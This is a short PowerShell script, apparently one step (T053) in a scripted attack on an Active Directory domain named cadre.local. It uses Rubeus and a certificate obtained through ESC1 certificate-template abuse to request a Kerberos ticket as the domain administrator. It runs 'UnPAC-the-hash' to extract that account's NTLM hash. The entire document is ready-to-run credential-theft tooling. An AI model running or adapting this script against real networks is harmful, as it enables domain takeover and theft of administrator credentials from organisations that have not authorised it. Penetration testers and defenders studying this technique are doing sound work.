# T053 UnPAC-the-hash via Rubeus with the ESC1 admin pfx (cadre.local)
$ErrorActionPreference = "Continue"
$rubeus = "C:\Tools\cadre-attack\Rubeus.exe"
$pfx    = "C:\Tools\cadre-attack\C__Tools_cadre-attack_esc1.pfx"
Write-Output "rubeus=$(Test-Path $rubeus) pfx=$(Test-Path $pfx)"
if (-not (Test-Path $rubeus)) { Write-Output "NO_RUBEUS"; exit 1 }
if (-not (Test-Path $pfx))    { Write-Output "NO_PFX"; exit 1 }

# Rubeus asktgt with cert (empty pfx password -> use /password:"" if needed)
& $rubeus asktgt /user:administrator /domain:cadre.local /certificate:$pfx /password:"" /unpac-thehash /nowrap 2>&1 | Select-Object -Last 30
Write-Output "rubeus_rc=$LASTEXITCODE"
Write-Output "=== T053_DONE ==="
